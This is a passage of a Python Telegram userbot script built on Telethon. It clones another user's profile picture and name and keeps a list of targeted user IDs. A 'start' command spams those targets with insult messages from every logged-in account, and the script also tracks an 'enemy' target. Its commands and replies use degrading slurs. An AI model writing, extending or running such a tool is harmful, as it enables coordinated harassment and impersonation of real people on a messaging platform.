                await event.reply(f"Failed to set profile picture: {str(e)[:100]}")
            
            new_first_name = target_user.first_name or ""
            new_last_name = target_user.last_name or ""
            
            try:
                await client(UpdateProfileRequest(
                    first_name=new_first_name,
                    last_name=new_last_name
                ))
                await event.reply(f"Name cloned: {new_first_name} {new_last_name}".strip())
            except Exception as e:
                await event.reply(f"Failed to set name: {str(e)[:100]}")
            
            await event.reply(f"CLONE COMPLETE\nID: {target_user.id}")
            
        except Exception as e:
            await event.reply(f"Clone failed: {str(e)[:200]}")
        return
    
    # BACK
    if text == "back":
        try:
            photos = await client.get_profile_photos(await client.get_me(), limit=1)
            if photos:
                await client(DeletePhotosRequest(id=[photos[0]]))
            
            if ORIGINAL_PHOTO:
                try:
                    photo_path = await client.download_media(ORIGINAL_PHOTO, file="orig_profile.jpg")
                    if photo_path:
                        await client(UploadProfilePhotoRequest(
                            file=await client.upload_file(photo_path)
                        ))
                        try:
                            os.remove(photo_path)
                        except:
                            pass
                except:
                    pass
            
            if ORIGINAL_NAME:
                await client(UpdateProfileRequest(
                    first_name=ORIGINAL_NAME,
                    last_name=""
                ))
            
            await event.reply("back")
        except Exception as e:
            await event.reply(f"faild{str(e)[:100]}")
        return

    # BITCH (set tag targets)
    if text.startswith("bitch"):
        try:
            parts = text.split()
            if len(parts) < 2:
                await event.reply("Provide at least one User ID.\nUsage: bitch user_id1 user_id2 ...")
                return

            user_ids = []
            invalid_ids = []

            for part in parts[1:]:
                try:
                    user_id = int(part.strip())
                    user_ids.append(user_id)
                except ValueError:
                    invalid_ids.append(part)

            if invalid_ids:
                await event.reply(f"Invalid user IDs: {', '.join(invalid_ids)}")
                return

            if not user_ids:
                await event.reply("No valid User IDs provided.")
                return

            TAG_TARGETS = user_ids
            await event.reply(f"{len(TAG_TARGETS)} \nIDs: {'`, `'.join(map(str, TAG_TARGETS))}")

        except Exception as e:
            await event.reply(f"Error: {str(e)}")
        return

    # New command: addbitch - works with reply
    if text.startswith("addbitch"):
        try:
            # Check if the message is a reply
            if not event.is_reply:
                await event.reply("Reply to a user's message to add them\nUsage Reply to a message and send 'addbitch'")
                return

            # Get the replied message
            replied_msg = await event.get_reply_message()
            if not replied_msg:
                await event.reply("i cant see reply u stupid bitch")
                return

            # Get the sender ID from the replied message
            sender_id = replied_msg.sender_id

            # Check if sender_id is valid
            if not sender_id:
                await event.reply("Could not get user ID from the replied message.")
                return

            # Add the ID to the TAG_TARGETS list
            try:
                TAG_TARGETS.append(sender_id)
            except Exception:
                TAG_TARGETS = [sender_id]

            await event.reply(f"⍀ user ID {sender_id} to the bitch list")

        except Exception as e:
            await event.reply(f"Error: {str(e)}")
        return

    # LISTBITCH - show current TAG_TARGETS
    if text.startswith("listbitch"):
        if TAG_TARGETS:
            await event.reply(f"╋ Bitch List ({len(TAG_TARGETS)}):\n{', '.join(map(str, TAG_TARGETS))}")
        else:
            await event.reply("✚ The bitch list is empty ✚")
        return

    # REMOVEBITCH - remove by ID or by reply
    if text.startswith("removebitch"):
        try:
            parts = text.split()
            # If used as reply without args, remove replied user
            if event.is_reply and len(parts) == 1:
                replied = await event.get_reply_message()
                if replied and replied.sender_id:
                    rid = replied.sender_id
                else:
                    await event.reply("Could not get user from reply")
                    return
            elif len(parts) >= 2:
                try:
                    rid = int(parts[1])
                except ValueError:
                    await event.reply("Provide a valid numeric user ID or reply to a message")
                    return
            else:
                await event.reply("Usage: removebitch <user_id> or reply and send removebitch")
                return

            if rid in TAG_TARGETS:
                TAG_TARGETS.remove(rid)
                await event.reply(f"⚚ Removed user ID {rid} from bitch list ⚚")
                
            else:
                await event.reply(f"User ID {rid} not in bitch list✘")
        except Exception as e:
            await event.reply(f"Error: {e}")
        return


    if text.startswith("clearbitch"):
        try:
            parts = text.split()
            if len(parts) > 1 and parts[1].lower() == "confirm":
                count = len(TAG_TARGETS)
                TAG_TARGETS.clear()
                await event.reply(f"☀ Cleared all {count} bitches from the list ☀")
            else:
                if TAG_TARGETS:
                    await event.reply(f" This will remove {len(TAG_TARGETS)} bitches from the list.\n"
                                     f"To confirm, send: `clearbitch confirm`\n"
                                     f"Current bitches: {', '.join(map(str, TAG_TARGETS))}")
                else:
                    await event.reply(" ⋆⋆⋆ The bitch list is already empty ⋆⋆⋆")
        except Exception as e:
            await event.reply(f"Error: {str(e)}")
        return







    # TIME (set tag delay)
    if text.startswith("time "):
        try:
            delay = float(text[5:].strip())
            if 1 <= delay <= 60:
                TAG_SPAM_DELAY = delay
                await event.reply(f"{TAG_SPAM_DELAY} seconds.")
            else:
                await event.reply("Delay must be between 1 and 60 seconds ❤︎")
        except ValueError:
            await event.reply("☀ Invalid number. Use time <seconds> (1-60) ☀")
        return

    # START (tag spam with ALL bots)
    if text == "start":
        if TAG_SPAM_ACTIVE:
            await event.reply("☀ spam is already running. Use stop first ☀")
            return
        if not FOSHLIST:
            await event.reply("No fosh messages available. Use addfosh first")
            return
        if not TAG_TARGETS:
            await event.reply(" ಄ No tag targets set. Use bitch <ids> or reply on them and type addbitch ಄")
            return
        
        TAG_SPAM_CHAT_ID = event.chat_id
        TAG_SPAM_ACTIVE = True
        if TAG_SPAM_TASK and not TAG_SPAM_TASK.done():
            TAG_SPAM_TASK.cancel()
        TAG_SPAM_TASK = asyncio.create_task(tag_spam_all_bots_loop(TAG_SPAM_CHAT_ID))
        await event.reply(
            f"Tag spam started with ALL {len(clients)} bots\n"
            f"Targets: {len(TAG_TARGETS)} user(s)\n"
            f"Delay: {TAG_SPAM_DELAY}s\n"
            f"Fosh count: {len(FOSHLIST)}\n"
            f"Symbol: {TAG_SYMBOL}"
        )
        return

    # STOP (tag spam)
    if text == "stop":
        if not TAG_SPAM_ACTIVE:
            await event.reply("ok")
            return
        TAG_SPAM_ACTIVE = False
        if TAG_SPAM_TASK and not TAG_SPAM_TASK.done():
            TAG_SPAM_TASK.cancel()
        await event.reply("ok ")
        return

    # SET (symbol)
    if text.startswith("set"):
        symbol = text[10:].strip()
        if not symbol:
            await event.reply("Please provide a symbol.\nUsage: set <symbol>")
            return
        TAG_SYMBOL = symbol
        await event.reply(f"♀ symbol set to: {TAG_SYMBOL}")
        return

    # PING
    if text == "bot":
        await event.reply(" 𝄃𝄃𝄂𝄂𝄀𝄁𝄃𝄂𝄂𝄃 O N L I N E 𝄃𝄃𝄂𝄂𝄀𝄁𝄃𝄂𝄂𝄃")
        return
    
    # STATUS
    if text == "status":
        status_msg = f"""
BOT STATUS

Admins: {len(ADMIN_IDS)} users
Bots online: {len(clients)}
Spam target: {SPAM_TARGET or 'Not set'}
Spam text: {SPAM_TEXT[:50]}...
Spam speed: {SPAM_SPEED} seconds
Spam active: {SPAM_ACTIVE}
Enemy target: {ENEMY_TARGET or 'None'}
Enemy active: {ENEMY_ACTIVE}
Fosh count: {len(FOSHLIST)}
Tag targets: {len(TAG_TARGETS)} user(s)
Tag delay: {TAG_SPAM_DELAY}s
Tag symbol: {TAG_SYMBOL}
"""
        await event.reply(status_msg)
        return
    
    # SUDO SU (add admin)
    if text.startswith("sudo su"):
        try:
            parts = text.split()
            if len(parts) < 3:
                await event.reply("Usage: sudo su <user_id>")
                return
            try:
                new_admin = int(parts[2].strip())
            except ValueError:
                await event.reply("Invalid user ID. Must be a number.")
                return

            if new_admin == user_id:
                await event.reply("You already have root permission.")
                return
            if new_admin in ADMIN_IDS:
                await event.reply("User is already an admin.")
                return
            ADMIN_IDS.add(new_admin)
            await event.reply(f"User {new_admin} now has root permission")
            print(f"[BOT] New admin added: {new_admin}")
        except Exception as e:
            await event.reply(f"Failed to add admin: {str(e)[:100]}")
        return

    # KILADMIN (remove admin)
    if text.startswith("kiladmin"):
        try:
            parts = text.split(maxsplit=1)  
            if len(parts) < 2:
                await event.reply("Usage: kiladmin <user_id>")
                return
            rem_admin = int(parts[1].strip())
            
            if rem_admin not in ADMIN_IDS:
                await event.reply("User doesn't have root permission.")
                return
            if len(ADMIN_IDS) <= 1:
                await event.reply("Cannot remove the last root user.")
                return
            ADMIN_IDS.remove(rem_admin)
            await event.reply(f"User {rem_admin} no longer has root permission")
            print(f"[BOT] Admin removed: {rem_admin}")
        except (ValueError, IndexError):
            await event.reply("Invalid user ID.")
        return


async def run_user(index, phone):
    """Run a single user account instance."""
    global clients, MASTER_CLIENT
    
    client = TelegramClient(f"user_session_{index}", API_ID, API_HASH)
    await client.start(phone=phone)
    clients.append(client)
    
    if index == MASTER_BOT_INDEX:
        MASTER_CLIENT = client
    
    me = await client.get_me()
    
    print(f"[USER {index}] Logged in as: {me.first_name} (@{me.username})")
    print(f"[USER {index}] User ID: {me.id}")
    
    client.add_event_handler(handle_all_messages, events.NewMessage())
    # start background task to fetch old PMs for this client
    try:
        asyncio.create_task(fetch_old_messages(client))
    except Exception:
        pass
    
    await client.run_until_disconnected()


async def main():
    global ALL_BOTS_RUNNING
    
    print("=" * 60)
    print("[BOT] Starting User Account System...")
    print(f"[BOT] Admins: {ADMIN_IDS}")
    print(f"[BOT] Using phone: {PHONE_NUMBER}")
    print(f"[BOT] Master Bot Index: {MASTER_BOT_INDEX}")
    print("[BOT] ALL commands run on ALL user sessions")
    print("=" * 60)
    
    ensure_forward_files()
    
    # Only run a single user account (no tokens)
    phones = [PHONE_NUMBER]
    bot_tasks = []
    
    for i, phone in enumerate(phones):
        if not phone:
            print(f"[BOT] Skipping user {i+1} - Invalid phone")
            continue
        task = asyncio.create_task(run_user(i, phone))
        bot_tasks.append(task)
        await asyncio.sleep(0.5)
    
    if not bot_tasks:
        print("[BOT] No valid phone numbers found")
        return
    
    print("[BOT] ALL USER ACCOUNTS STARTED")
    print("=" * 60)
    
    await asyncio.gather(*bot_tasks)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("[BOT] Shutting down...")
    except Exception as e:
        print(f"[ERROR] Bot crashed: {e}")
